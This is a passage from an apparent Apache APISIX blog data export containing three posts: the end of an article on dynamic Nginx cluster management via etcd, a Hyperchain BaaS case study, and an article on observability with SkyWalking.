require(\\"apisix.admin.plugin_config\\"),\\n}\\n```\\n\\nTherefore, the above curl request will be processed by the `put` function in the /apisix/admin/upstreams.lua file, see the implementation of the `put` function as follows:\\n\\n```lua\\n-- /apisix/admin/upstreams.lua file\\nfunction _M.put(id, conf)\\n    -- check the legitimacy of the requested data\\n    local id, err = check_conf(id, conf, true)\\n    local key = \\"/upstreams/\\" .. id\\n    core.log.info(\\"key: \\", key)\\n    -- Generate configuration data in etcd\\n    local ok, err = utils.inject_conf_with_prev_conf(\\"upstream\\", key, conf)\\n    -- write to etcd\\n    local res, err = core.etcd.set(key, conf)\\nend\\n\\n-- /apisix/core/etcd.lua\\nlocal function set(key, value, ttl)\\n    local res, err = etcd_cli:set(prefix ... key, value, {prev_kv = true, lease = data.body.ID})\\nend\\n```\\n\\nThe new configuration is eventually written to etcd. As you can see, Nginx verifies the data before writing it to etcd, so that other worker processes and Nginx nodes will receive the correct configuration through the watch mechanism. You can verify this process with the logs in error.log.\\n\\n```yaml\\n2021/08/03 17:15:28 [info] 16437#16437: *23572 [lua] upstreams.lua:72: key: /upstreams/1, client: 127.0.0.1, server: _, request: \\"PUT /apisix/admin/upstreams/1 HTTP/1.1\\", host: \\"127.0.0.1:9080\\"\\n```\\n\\n### Why the new configuration works without reload\\n\\nLet\'s look at how the Nginx worker process takes effect immediately after the admin request is executed.\\n\\nThe open source version of Nginx matches requests based on three different containers.\\n\\n1. The `server_name` configuration in the static hash table is matched to the requested `Host` domain name\\n2. Next, the location in the static Trie prefix tree is configured to match the requested URI\\n\\n    ![Matching process for location prefix tree 2](https://static.apiseven.com/202108/1631170657240-31bb3ff3-ee3b-4831-99ff-77cab1d6e298.png)\\n\\n3. In both of these processes, if there are regular expressions, they are matched in order based on the order of the arrays (the order they appear in nginx.conf).\\n\\nAlthough these procedures are very efficient, they are written to die in the find_config phase and in the Nginx HTTP framework, and changes must be made after nginx -s reload to take effect. For this reason, Apache APISIX has abandoned this process altogether.\\n\\nAs you can see in nginx.conf, requests to any domain name, URI, or domain name will match the `http_access_phase` lua function.\\n\\n```lua\\nserver {\\n    server_name _;\\n    location / {\\n        access_by_lua_block {\\n            apisix.http_access_phase()\\n        }\\n        proxy_pass      $upstream_scheme://apisix_backend$upstream_uri;\\n    }\\n}\\n```\\n\\nThe `http_access_phase` function will match Method, domain and URI based on a base prefix tree implemented in C (only wildcards are supported, no regular expressions), the library is [lua-resty-radixtree](https://github.com/api7/lua -resty-radixtree). Whenever the routing rules change, the Lua code rebuilds this base tree: the\\n\\n```lua\\nfunction _M.match(api_ctx)\\n    if not cached_version or cached_version ~= user_routes.conf_version then\\n        uri_router = base_router.create_radixtree_uri_router(user_routes.values,\\n                                                             uri_routes, false)\\n        cached_version = user_routes.conf_version\\n    end\\nend\\n```\\n\\nThe rules for Plugin enablement, parameter and order adjustment are similar.\\n\\nFinally, Script is mutually exclusive with Plugin. In fact, Lua JIT\'s just-in-time compilation provides another killer feature, loadstring, which converts strings to Lua code. So, after storing Lua code in etcd and setting it to Script, you can pass it to Nginx to process requests.\\n\\n## Summary\\n\\nNginx cluster management must rely on a centralized configuration component, and etcd, which is highly reliable and has a watch push mechanism, is the perfect choice! Although the Resty ecosystem does not have a gRPC client, it is still a good idea for each worker process to synchronize etcd configuration directly via the HTTP/1.1 protocol.\\n\\nThe key to dynamically modifying the Nginx configuration is 2 things: the Lua language is much more flexible than the nginx.conf syntax, and Lua code can be imported from external data via loadstring. Of course, to ensure efficient execution of route matching, Apache APISIX implements a prefix base tree in C to match requests based on Host, Method, and URI, improving performance while maintaining dynamism.\\n\\nApache APISIX has many good designs, and this article only discusses the dynamic management of Nginx clusters.\\n\\n[click here for the link to the original article](https://www.taohui.tech/2021/08/10/%E5%BC%80%E6%BA%90%E7%BD%91%E5%85%B3APISIX%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/#more)"},{"id":"2021/08/09/apache-apisix-in-quliankeji","metadata":{"permalink":"/blog/2021/08/09/apache-apisix-in-quliankeji","source":"@site/blog/2021/08/09/Apache-APISIX-in-Quliankeji.md","title":"Hyperchain Technology implements BaaS platform with APISIX","description":"This article introduces the implementation of cloud-native API gateway Apache APISIX in the Hyperchain Blockchain BaaS platform, and the reasons for choosing Apache APISIX.","date":"2021-08-09T00:00:00.000Z","formattedDate":"August 9, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":9.685,"truncated":true,"authors":[{"name":"Weifeng Sheng"}],"prevItem":{"title":"APISIX Architecture: How to Dynamically Manage NGINX Cluster?","permalink":"/blog/2021/08/10/apisix-nginx"},"nextItem":{"title":"How to Improve the Observability of Nginx with Apache APISX","permalink":"/blog/2021/08/06/using-apache-apisix-to-improve-the-observability-of-nginx"}},"content":"> This article introduces the landing practice of Apache APISIX in Hyperchain Blockchain BaaS platform, and explains why Hyperchain Technology has chosen Apache APISIX among many gateway applications.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\nBaaS, which is also known as \u201cBlockchain as a Service\u201d, is an open platform that embeds blockchain framework into cloud computing platform and provides convenient and high performance blockchain ecological environment and ecological support services for developers by taking advantage of the deployment and management of cloud service infrastructure to support their business expansion and operation. It is an open blockchain platform that supports developers\u2019 business expansion and operation support.\\n\\nTypically, a complete BaaS solution includes four main components: device access, access control, service monitoring and blockchain platform.\\n\\n![BaaS introduction](https://static.apiseven.com/202108/1646723437500-89897c8a-7912-49d3-bea9-1f21e3e6e0d7.001)\\n\\n**We can build blockchain network quickly and flexibly through BaaS. For enterprises, with BaaS platform, we can manage blockchain business in a unified way.**\\n\\nI believe that many of you have come across the contract code on top of Ethernet. Through BaaS platform, we can easily write smart contracts on the IDE and then deploy it to our created blockchain network, and finally for the upper layer services to call the blockchain-related contracts to carry out the flow of business.\\n\\nBecause the chain has so many nodes, from tens to thousands, it is difficult to monitor and maintain the operation of the chain without the support of BaaS platform. By using BaaS platform, users can not only save cost, but also manage the blockchain more conveniently and the security of the whole system is higher.\\n\\nThe architecture of BaaS product of Hyperchain Technology is divided into four layers in total, which are resource layer, blockchain underlying layer, blockchain service layer and application layer.\\n\\n![Hyperchain BaaS Architecture](https://static.apiseven.com/202108/1646723539486-3d0d42a2-217e-420d-8e6f-22eb4b37d464.002)\\n\\nNow that we have a preliminary understanding of Baas platform, let\u2019s take a look at the usage scenarios and gains of Apache APISIX on BaaS system.\\n\\n## Apache APISIX Usage Scenarios and Gains\\n\\n### Scenario 1: Practice on BaaS system\\n\\n![Apache APISIX applied on BaaS system](https://static.apiseven.com/202108/1646814465109-4ec35266-ce3f-4547-bab7-d75edd332e0c.003)\\n\\nThe architecture of Hyperchain\u2019s BaaS platform is not only microservices-based, but also divided into two layers, which are business access layer and core service layer.\\n\\nBFF (Backend For Frontend) is generally to the frontend, through HTTP access. The core services are generally registered through services like Dubbo, ETCD, etc., and finally accessed using gRPC.\\n\\nThe role of BFF is to do business aggregation, format adaptation, and give the final result data to the frontend.\\n\\nThese business modules need to store the relevant information in the registry (ETCD), and then read out the information through the gateway module when it is used.\\n\\n![Hyperchain BaaS Platform Workflow](https://static.apiseven.com/202108/1646814465106-81be15cb-aabf-4240-a98b-e2cd6b8bc5ad.003_1)\\n\\nIn the whole process, we mainly use four features of Apache APISIX.\\n\\n- Routing and Forwarding\\n- Traffic Control\\n- Security and Access Control\\n- Dynamic Loading\\n\\nLet\u2019s learn more about how these features are used on the Hyperchain BaaS system below.\\n\\n#### Routing and Forwarding\\n\\n![Apache APISIX Proxy-rewrite Routing and Forwarding](https://static.apiseven.com/202108/1646723635425-8adc8c53-5a00-4457-9ac7-0b8f55308d27.004)\\n\\nHyperchain uses the official Proxy-rewrite plugin provided by Apache APISIX to perform route forwarding services.\\n\\nWhen a request accesses port 8080, through the Proxy-rewrite plugin, the request will be accessed to the API of the corresponding service.\\n\\n![Apache APISIX Proxy-rewrite Routing and Forwarding 2](https://static.apiseven.com/202108/1646723635426-c5de189b-e934-4395-b671-f0d161fa8c19.005)\\n\\nThe above figure shows the interface of Proxy-rewrite, we can see that you can match your own forwarding rules by regular matching, of course, you can also write HOST or by URL to match.\\n\\n#### Traffic Control\\n\\nBefore Apache APISIX, the platform needed to write its own logic code. With Apache APISIX, we can directly use the officially provided Limit-req plugin to limit the input and output for the purpose of protecting the system.\\n\\nThrough the interface of the Limit-req plugin, we can easily configure parameters such as speed, bucket height, etc.\\n\\n![Apache APISIX Traffic Control](https://static.apiseven.com/202108/1646723635427-0550eac8-a4dd-40c9-99f8-8ec42646fd2a.006)\\n\\nIn the Hyperchain BaaS platform, customers can build any chains according to their needs. At this point, the BaaS platform needs to quickly support the creation of these chains and manage their lifecycle.\\n\\nThe creation of these federated chains is not solved by hard code written directly on the code, but by driver components. In a privatization scenario, we need to have such driver components to provide support quickly and need to control the frequency of access to the driver processes.\\n\\n![Apache APISIX Traffic Control 2](https://static.apiseven.com/202108/1646723635428-5473b0db-b7f9-4bfa-b91c-063d68a6ed60.007)\\n\\nBefore Apache APISIX, the platform needed to write its own logic code. With Apache APISIX, we can directly use the officially provided Limit-req plugin to limit the input and output for the purpose of protecting the system. Through the interface of the Limit-req plugin, we can easily configure parameters such as speed, bucket height, etc.\\n\\n![Apache APISIX Traffic Control 3](https://static.apiseven.com/202108/1646723635429-36f04fcf-0596-43b1-9147-af79c2786ba2.008)\\n\\n#### Security and Access Control\\n\\n![Apache APISIX Security and Access Control](https://static.apiseven.com/202108/1646723635429-554b8e0f-8be8-4828-91cf-cc4784d30558.009)\\n\\nIn Hyperchain\u2019s privatization scenario, many users don\u2019t like to use the account system provided by the platform and ask the platform to connect to their existing account system, so Hyperchain uses Apache APISIX\u2019s Access-Auth plugin to adapt the third-party authentication service address with it.\\n\\n![Apache APISIX Security and Access Control 2](https://static.apiseven.com/202108/1646723635430-e5e6d1ad-79c5-4a4e-b82b-2803794bc7d0.010)\\n\\nIn Baas platform, all web requests will go through Apache APISIX\u2019s Access-Auth plugin, complete cookie parsing and authentication, then carry user information in HEAD header and pass to back-end microservices to process business. The advantage of this is that the developer of the microservice does not need to parse the cookie, but can send the user information to the microservice module directly, which is very convenient.\\n\\n#### Dynamic Loading\\n\\n![Apache APISIX Dynamic Loading](https://static.apiseven.com/202108/1646723635431-1a0f5d29-2643-4d72-8ec7-265ea181bc47.011)\\n\\nThe client interface of Baas platform of Hyperchain does not have a \u201cstore\u201d button on top; however, there is a \u201cstore\u201d button on the public platform of Baas of Hyperchain. In some privatization scenarios, the \u201cstore\u201d button is not needed, but the backend services of both are shared, and the platform interface will be displayed differently according to the demand as soon as the backend services are started.\\n\\nHyperchain uses Apache APISIX to operate in collaboration with the service center to ensure the addition and adjustment of front-end microservice business modules, which makes the online publishing process of Hyperchain\u2019s Baas platform very easy.\\n\\n### Scenario 2: Practice on blockchain nodes\\n\\n![blockchain nodes](https://static.apiseven.com/202108/1646723635432-a4e185fd-3648-4a60-83b7-f767560c3a4d.012)\\n\\nWhen a user buys a chain through the BaaS platform, its upper business or developer client connects directly to the nodes, for example, a bank connects to three on the left, an insurance connects to three on the right, or some users access a whole chain. This will bring a big problem because basically every node will be accessed, so we need to expose all the nodes on the blockchain to the public network environment.\\n\\n#### Conserve public network ports\\n\\n![public network ports](https://static.apiseven.com/202108/1646723635433-3999243b-7457-48d3-803a-99860c9e1bac.013)\\n\\nThis situation may be acceptable for private users, but for a BaaS platform like Hyperchain, which is open to all Internet users, it requires dozens or hundreds or thousands of public IPs, which is not only very costly but also a waste of public IP resources.\\n\\nIn order to solve this problem, Hyperchain\u2019s Baas platform uses Apache APISIX.\\n\\n#### Access Control\\n\\n![Access Control](https://static.apiseven.com/202108/1646723635433-7e76d02b-99e9-479a-8cbf-a56ae120913d.014)\\n\\nUnlike traditional software, different heterogeneous chains have their own very complicated RBAC permission control, so users need to add many certificates on the client side, which is a great headache.\\n\\nIn order to solve this pain point, Baas platform of Hyperchain Technology uses Apache APISIX\u2019s Key-auth plugin to allow users with permission to access directly and unify the permission control of all chains.\\n\\n#### Improved node stability\\n\\n![blockchain nodes 2](https://static.apiseven.com/202108/1646723635434-60398981-d33b-4b7c-b43c-0aba4b0779a7.015)\\n\\nOne of the properties of blockchain is that, essentially, accessing any node is the same.\\n\\nJust like Bitcoin, we access any node to get the data, so many users operate directly against a node.\\n\\n![Improved node stability](https://static.apiseven.com/202108/1646723635435-3dd3e082-f1aa-4763-ab46-c15d34a28f58.016)\\n\\nHowever, the direct access to a single node model is vulnerable to attacks. For example, banks have a very high concurrency, TPS can reach 4\u20135W/sec, and every transaction will hit this node.\\n\\nIn order to achieve the effect of fast dynamic scaling, Hyperchain\u2019s Baas platform utilizes Apache APISIX HPA deployment model on Kubernetes to dynamically scale according to the traffic, effectively solving the single-point traffic impact problem.\\n\\n#### Multi-protocol support\\n\\n![Multi-protocol support](https://static.apiseven.com/202108/1646723635435-d68f64a9-6dc2-40d4-ab81-9604767d363d.017)\\n\\nBecause Hyperchain\u2019s Baas platform uses a lot of heterogeneous chains, the protocols used are very diverse, such as HTTP, RPC, WebSocket and so on. Apache APISIX supports multi-protocols very well, which can fully meet the use of Baas platform in the relevant scenarios, which significantly reduces the development cost.\\n\\n![Multi-protocol support 2](https://static.apiseven.com/202108/1646723635436-2cd77c45-6a60-4ad2-aa24-0d47758fbe3a.018)\\n\\n## What were the kinks we went through before choosing Apache APISIX?\\n\\nBefore choosing Apache APISIX, Hyperchain\u2019s Baas platform was already using Kong, but Kong was later abandoned.\\n\\n**Why did we give up on Kong?**\\n\\nKong uses PostgreSQL to store its information, which is obviously not a good way to do it.\\n\\n![Kong](https://static.apiseven.com/202108/1646723635437-69eef80d-9f35-4164-9779-b1c65bc311d8.019)\\n\\nIn the software industry, high availability configuration of databases is very complex. Not only do you need to have a dedicated DBA, but the implementation is also very difficult.\\n\\nThe Baas system of Hyperchain Technology is already using MySQL, if we need to build a PostgreSQL database here, it means that Hyperchain Technology\u2019s Baas system needs to have two sets of relational databases. This brings problems to the implementation difficulty and operation and maintenance cost, and introduces more risks.\\n\\nAt the same time, because ETCD is also used in many places of Hyperchain\u2019s Baas platform, finally, Hyperchain abandoned Kong and invested in Apache APISIX which is based on ETCD.\\n\\n**Why did we give up on Nginx?**\\n\\nSome of you may think, \u201cWhy not use Nginx?\\n\\nYes, Hyperchain\u2019s BaaS platform used to use Nginx, but later we found that Nginx has many imperfections compared to Apache APISIX.\\n\\n![Nginx](https://static.apiseven.com/202108/1646723635437-d6e57e5d-3a6f-4140-9a1a-68adcd3790a0.020)\\n\\n- **Issues on hot starts and hot plugins**\\n\\nIn the Hyperchain BaaS platform, we not only need to manage the federated chain, but also need to be able to add and delete nodes at any time.\\n\\n- **Clustering difficulties**\\n\\nWhile Nginx is very difficult to cluster, Apache APISIX can be implemented with ETCD clustering enhancements.\\n\\n- **Unable to proxy TCP and UDP directly**\\n\\nBy default, Nginx can only implement proxies for Layer 7 networks. To support Layer 4 networks, you need to recompile the Stream module, while Apache APISIX can support both Layer 4/7 proxies.\\n\\n- **Lack of Dashboard**\\n\\nNginx does not have a Dashboard, and the Apache APISIX Dashboard makes it less difficult for development and operations staff to manage nodes.\\n\\n## Future Plans\\n\\n![Future Plans](https://static.apiseven.com/202108/1646723635438-7392246c-e644-41ca-a4aa-599533f47239.021)\\n\\n### Plan 1: Use Apache APISIX provided or self-developed logging plugins\\n\\nThe official website of Apache APISIX already provides a lot of logging plugins, such as HTTP and UDP support, including kafka, etc. However, for a platform like Hyperchain BaaS, which needs to control thousands of blockchain networks, it is a big headache to search for fault traces in the logs when every problem occurs.\\n\\nIn the near future, Hyperchain will add some APM functions between BaaS system and blockchain system based on Apache APISIX. Improve the efficiency of operation and maintenance management in multi-chain scenarios.\\n\\n### Plan 2: Development of monitoring plugins to achieve traceability\\n\\nDomestic regulation of blockchain is very strict, and all operations need to be traceable and traceable.\\n\\nIn the future, Hyperchain Technology will develop regulatory plugins based on Apache APISIX to improve the regulatory capability and add VIP, whitelist, replay and other functions.\\n\\n### Plan 3: Use APISIX Ingress Controller instead of Kubernetes\u2019 default Nginx-Ingress\\n\\nWhen deploying Kubernetes, we usually choose Nginx-Ingress to handle outbound requests, but because of some of the Nginx issues mentioned above, Hyperchain is investigating using APISIX Ingress Controller.\\n\\n### Plan 4: Explore Service Mesh\\n\\nHyperchain has tried traffic-mesh before, and will try to use APISIX Mesh in the future."},{"id":"How to Improve the Observability of Nginx with Apache APISX","metadata":{"permalink":"/blog/2021/08/06/using-apache-apisix-to-improve-the-observability-of-nginx","source":"@site/blog/2021/08/06/using-apache-apisix-to-improve-the-observability-of-nginx.md","title":"How to Improve the Observability of Nginx with Apache APISX","description":"This article will introduce NGINX observability, the relationship between Apache APISIX and Nginx, APISIX observability, and further improving observability with Apache SkyWalking.","date":"2021-08-06T00:00:00.000Z","formattedDate":"August 6, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":13.03,"truncated":true,"authors":[{"name":"Wei Jin","url":"https://github.com/gxthrj","imageURL":"https://avatars.githubusercontent.com/u/4413028?v=4"}],"prevItem":{"title":"Hyperchain Technology implements BaaS platform with APISIX","permalink":"/blog/2021/08/09/apache-apisix-in-quliankeji"},"nextItem":{"title":"Kong-To-APISIX Migration Tool","permalink":"/blog/2021/08/05/kong-to-apisix"}},"content":"> This article shares solutions and practices for observability in the context of Nginx observability, the relationship between Apache APISIX and Nginx, Apache APISIX observability, and further enhancing observability in conjunction with Apache SkyWalking.\\n\\n\x3c!--truncate--\x3e\\n\\n## Overview\\n\\n\\"Observability\\" is a metric that allows you to keep track of how your infrastructure, system platform, or application is performing. Commonly, metrics, logging, and tracing and events data are collected to help developers and operations staff detect, investigate, alert, and correct system problems.\\n\\nIn this article, we will share solutions and practices for observability in the context of Nginx observability, the relationship between Apache APISIX and Nginx, Apache APISIX observability, and further observability improvements in conjunction with Apache SkyWalking.\\n\\n## Nginx Observability\\n\\n### Common monitoring methods for Nginx\\n\\nNginx is observable to some extent, and the following is a list of common monitoring methods for Nginx.\\n\\n1. ngx_http_stub_status_module\\n2. VTS module + exporter + prometheus + grafana (if you have a low version of Nginx, you need to introduce exporter)\\n3. Nginx Amplify SaaS\\n\\n#### ngx_http_stub_status_module\\n\\nThe ngx_http_stub_status_module mainly collects instance-level statistics.\\n\\n#### VTS module\\n\\nThe VTS module has 3 obvious drawbacks.\\n\\n1. **Complex installation**: Although VTS module is able to collect metrics and collect more types of metrics, it is more complex to install. If you want to use the VTS module, you need to recompile Nginx, add the VTS moudle before compiling Nginx, and reinstall Nginx after completing the compilation before you can use VTS properly. 2.\\n\\n2. **Weak extensibility**: VTS extensibility is divided into two parts: one is to add extensions to VTS before compilation; the other is to add extensions after compilation -- modifying the nginx.conf configuration file. Adding extensions by modifying the nginx.conf file will cause Nginx to reload, and a direct reload of the production environment may have some impact on the business.\\n\\n3. **Slow community updates**: The last update to the VTS module was in 2018, and it has been down for 3 years.\\n\\n#### Nginx Amplify SaaS\\n\\nNginx Amplify is a SaaS service where Nginx Amplify provides services on the remote end and installs agents outside of the Nginx service.\\nIf you install the collection module outside of Nginx, you are limited in the metrics you can collect, and you can only get the information exposed by Nginx, not the internal information that is not exposed.\\n\\nIn addition, because Nginx Amplify SaaS is a SaaS service, you need to transfer the collected data to the server through the public network, which can pose some security risks and keep some enterprise users out. Perhaps Nginx Amplify is targeted at enterprise users like Nginx plus, not open source users.\\n\\nAlso, the Nginx Amplify SaaS community is not active and has been down for 2 years.\\n\\n### Nginx\'s pitfalls\\n\\nNginx has its own flaws in Events collection, two of which are listed here.\\n\\nNginx is configured based on nginx.conf, which is reloaded after changes are made to the nginx.conf file. There are no Events available other than reload events, so we can\'t know what has changed each time we modify the file, e.g., if we start with one route and modify the file to add 10 routes, we won\'t know which 10 routes have been added with only reload events.\\n\\nNginx is a reverse proxy, and the real backend service may be restarted, upgraded, or abnormal, so without active health checks and relying on passive checks, we will only know that something is wrong with the service when the traffic is abnormal, which will throw away many Events and result in incomplete information about upstream Events. .\\n\\n### Nginx Observability Summary\\n\\nThe open source version of Nginx does not provide very good monitoring. Although Nginx provides some monitoring tools, they are very complex to install and configure and have little scalability. It is possible that these tools are not designed for observability, but simply to be able to see metrics or statistics to easily pinpoint problems. There are various observability setup products available, but they are difficult to integrate into Nginx.\\n\\nIn addition, the Nginx community is stagnant, resulting in slow iterations of Nginx.\\n\\n## Apache APISIX Overview\\n\\n### Apache APISIX in relation to Nginx\\n\\n![Relationship between Apache APISIX and Nginx](https://static.apiseven.com/202108/1630651158638-aba4e627-d2d6-4bf5-b431-61eb3913a296.png)\\n\\nApache APISIX is based on the Nginx implementation, but relies only on the Nginx network libraries. On top of Nginx, Apache APISIX implements its own core code, with extension mechanisms reserved.\\n\\nThe table shows a comparison of Apache APISIX and Nginx features. Apache APISIX can do both reverse proxy and implement some features that Nginx does not support, such as: active health checking, traffic management, horizontal scaling, etc., and these features are open source.\\n\\n- **API Design**: It is simpler to use Apache APISIX for API design.\\n- **Open Source Dashboard**: The reverse proxy can be configured all in the interface.\\n- **Active Health Check**\uff1aApache APISIX supports active health checks, which can be combined with Events to improve observability.\\n- **Traffic Management**: Suitable for monitoring data, or for use when a business release goes live.\\n- **Horizontal Scaling**: Apache APISIX supports horizontal scaling, a feature that is made possible by the Apache APISIX architecture (see below).\\n- **Plug-in extension mechanism**: Apache APISIX\'s plug-in extension mechanism makes it extremely powerful and scalable.\\n- **Plugin orchestration**: Multiple plugins are logically orchestrated and combined for use according to business requirements.\\n- **Certificate Management**: Apache APISIX supports dynamic certificate management.\\n\\n![Apache APISIX Architecture Diagram](https://static.apiseven.com/202108/1630651158643-ecc67e12-2076-41e5-88d8-baa14144f35d.png)\\n\\n### Apache APISIX Introduction\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, and other rich traffic management features. Apache APISIX is also the world\'s most active open source API gateway project, and is a production-ready, high-performance gateway. Hundreds of enterprises around the world have used Apache APISIX to handle business-critical traffic, covering finance, Internet, manufacturing, retail, carriers, and more, such as NASA, the EU\'s Digital Factory, Air China, China Mobile, Tencent, Huawei, Weibo, NetEase, Shell Finder, 360, Taikang, and more.\\n\\n### Apache APISIX Solution\\n\\n![Apache APISIX Full Traffic Solution](https://static.apiseven.com/202108/1630651158645-83c22975-ebf1-4861-8b61-38639a28875a.png)\\n\\nOn the left side of the diagram above, the evolution from top to bottom is from monolithic services to SOA (Service Oriented Architecture) to microservices.\\n\\nUnder SOA, gateways typically use Nginx or HAProxy; under microservices architecture, gateways use Nginx for load balancing. There are two common solutions for microservices architecture: one is based on Java technology stack implementation, such as Spring Cloud series; the other is Service Mesh.\\n\\nWhere does Apache APISIX fit into this evolutionary process and what can it do?\\n\\nSimply put, the parts in red in the diagram on the left (Nginx / HAProxy / Kong / Spring Cloud Zuul / Spring Cloud Gateway / Traefik / Envoy / Ingress Nginx) can all be replaced with an Apache APISIX solution.\\n\\n**In SOA there is Apache APISIX SLB solution, in microservice architecture there is Apache APISIX Gateway, in Kubernetes deployment there is Apache APISIX Ingress, in Service Mesh deployment there is Apache APISIX mesh**.\\n\\n![Apache APISIX Full Traffic Data Surface](https://static.apiseven.com/202108/1630651158648-dffd59dd-15c2-4f76-832e-5ed3763b18e5.png)\\n\\nIn terms of service request traffic, when a client initiates a request, it passes through the LB, passes through the Gateway, and the request is distributed to the back-end business service. The parts in red (LB / Gateway / Spring Cloud Gateway / K8s Ingress / Sidecar) can all choose Apache APISIX as the solution. Apache APISIX supports multi-language development plug-ins and can be written in Java under the Java architecture.\\n\\nApache APISIX is a full-flow data plane, and Apache APISIX has solutions for LB, Gateway, Ingress, and sidecar, and they are unified solutions in terms of observability. When the solution is unified, the management control chain is also easy to implement out.\\n\\n## Apache APISIX Observability\\n\\nAfter a brief look at Nginx and Apache APISIX, here are two questions: What can Apache APISIX do in terms of observability, and what are the advantages of Apache APISIX observability?\\n\\n### Types of data Apache APISIX supports to collect\\n\\nApache APISIX supports the following types of data collection.\\n\\n1. Tracing - integrated with SkyWalking\\n2. Metrics - integrated with SkyWalking / Prometheus\\n3. Logging - integration with SkyWalking / other logging platforms\\n\\nApache APISIX is a gateway-type product that can replace Nginx or other gateways; in terms of observability Apache APISIX can integrate with multiple APM or observable systems, e.g. Tracing part can integrate with SkyWalking, Metrics can integrate with SkyWalking or Prometheus, Logging can integrate with SkyWalking and other logging systems.\\n\\n### Apache APISIX advantages in observability\\n\\n#### High Scalability\\n\\nWhy does Apache APISIX have great extensibility? Because Apache APISIX supports writing plug-ins in multiple languages and can write plug-ins in programming languages such as Lua, Java, Golang, etc. Apache APISIX can extend its capabilities through plug-ins. The three data types mentioned above are implemented through the plug-in mechanism.\\n\\n#### Flexible Configuration Capabilities\\n\\nThree examples are given to illustrate the flexible configuration capabilities of Apache APISIX.\\n\\nThe first example is **Apache APISIX can modify the configuration of logging at runtime**, for example, by adding or modifying logging fields. Modifying logging fields is a relatively common requirement. For example, when a business first goes live, logging fields are configured, and after the system has been running for a while, several logging fields need to be modified or added. If you are using Nginx, you can do this by modifying the nginx.conf file and reloading the configuration to take effect. **Apache APISIX just needs to script the fields to take effect dynamically**.\\n\\nA second example of flexible configuration capabilities is the use of Prometheus. In Apache APISIX, if you want to create/delete a metric or extend metrics labels, just add a new metircs or fill in the relevant information in the Prometheus plugin, and Apache APISIX has a hot reload mechanism to take effect directly without restarting.\\n\\nThe third flexible configuration capability is in the Apache APISIX implementation, which manages all routing objects and has a set of object management mechanisms in memory. In Apache APISIX, you can add a plug-in to an API, and the level of effect can be refined to the API, and each API can be bound to the plug-in or the plug-in can be removed from the API. Apache APISIX can be fine-grained to control the observable data collection for each API in each service. In other words, you can collect only the data you care about most, and these configurations are dynamically in effect and can be adjusted at any time.\\n\\n#### Active Community\\n\\nOne of the most important advantages of Apache APISIX is that there is an active community, and an active community allows the product to iterate quickly, get better and better, and get everyone\'s needs met.\\n\\n![Apache APISIX Community Activity Comparison Chart](https://static.apiseven.com/202108/1630651158650-2c4a287f-45a3-4c49-94d1-5be3914e5f69.png)\\n\\nThe graph above shows the growth curves of Apache APISIX (green), Kong (light blue), mosn (yellow), and bfe (dark blue) contributors, with Apache APISX showing the fastest growth trend and the steepest curve. Apache APISIX community activity is the most active within its category.\\n\\n## Combining Apache SkyWalking for further improvements in observability\\n\\nWhat enhancements can be made by combining Apache APISIX with Apache SkyWalking? In addition to the SkyWalking tracing plugin, you can also aggregate tracing, metrics, logging, and events into SkyWalking, and use SkyWalking\'s aggregation capabilities to link data.\\n\\n### SkyWalking Satellite\\n\\nSkyWalking Satellite is developed by the Apache APISIX community, the Apache SkyWalking community, and Baidu in deep cooperation.\\n\\n![Apache APISIX SkyWalking Satellite](https://static.apiseven.com/202108/1630651158652-130e62e1-32dd-4705-9f24-ceffd039560a.png)\\n\\nSkyWalking Satellite follows the steps in the above diagram to collect data. SkyWalking Satellite can be deployed closer to the front-end where the data is generated, in the form of a sidecar.\\n\\nIn the diagram from top to bottom business requests go through Apache APISIX proxy to Upstream, Satellite is deployed next to Apache APISIX in the form of sidecar to collect data from Apache APISIX in three data types: tracing, metrics and logging, and send it to SkyWalking via GRPC protocol.\\n\\nThe most important point is that **in this deployment method, Apache APISIX can integrate the three data types directly into SkyWalking without making any changes**.\\n\\n### ALS Solution\\n\\nALS (Access Log Service) sends out access logs from Apache APISIX, adding special fields to the normal access log, e.g., adding key fields to facilitate topology map generation and aggregating metrics.\\n\\nThe biggest advantage of ALS solution is that it can directly analyze and aggregate three types of data, such as topology, metrics, and logging, by means of access log.\\nWhen using Prometheus, if you configure the statistics of metrics at the URI level, the whole metrics will be inflated dramatically. Because there may be dozens of services at the URI level, each metrics may be followed by many labels, which will slow down the performance of the gateway and make the metrics more difficult to obtain. **Use ALS solution to send the data to SkyWalking by streaming, leaving the calculation to SkyWalking and making it easy to query later**, without pulling very large data every few seconds.\\n\\n### Integrating Events into SkyWalking\\n\\nCommonly used Events include: configuration distribution, cluster changes, and health checks.\\n\\n**Configuration Distribution**: When configuring API distribution, routes may be added, routes modified, routes removed, or plugins added.\\n\\n**Cluster Changes**: When the cluster changes, you need to know the number of services in the cluster. For example, IPs change during expansion, and the changes are reflected when the gateway receives the message. Each process is an event, and these events need to be exposed.\\n\\n**Health Check**: Proactive detection of health, e.g., business request failure rate suddenly becomes high, and events detect unhealthy business services, at which point the problem can be quickly located.\\n\\n## Extended Reading\\n\\n### How the extension mechanism of Apache APISIX is implemented and its impact on stability\\n\\nQuestion: How is the extension mechanism of Apache APISIX implemented? Does extending this feature have an impact on the stability of Apache APISIX itself?\\n\\nA: The Apache APISIX extension mechanism benefits from its architecture, which allows adding business logic to each phase (rewrite / access / header_filter / body_filter / preread_filter / log).\\n\\nAs for stability, Apache APISIX has open sourced nearly 50 plugins, each of which is tested end-to-end and is proven to be stable and available. However, custom plug-ins have to follow certain specifications, which are simple, but we should not be too casual. The stability of the custom plug-ins is guaranteed and needs to be guaranteed by the business side itself.\\n\\n### How to confirm that rules are in effect\\n\\nQ: Nginx may have a lot of rules configured in the nginx.conf file, and the later rules may be blocked by the earlier rules, so it is not clear if the later rules are in effect.\\n\\nA: The more configuration you have in the nginx.conf file, and the more complex the configuration service, the more difficult it is to maintain this file. But in Apache APISIX, the configuration file is fixed, and the official Apache APISIX configuration is the optimal configuration for most scenarios, while other routing configurations are configured in the API, and the routing configuration is in memory.\\n\\nIn terms of management, you can manage your routes in a variety of organizational ways, for example, through the Dashboard.\\n\\nFor example, if you have a service called ABC, you can have various route definitions under this service, and the route definitions can be viewed in a list. Another way to view routes is to tag the API in the dashboard, which makes the management of routes more user-friendly and makes it easy to query the list of routes by tag 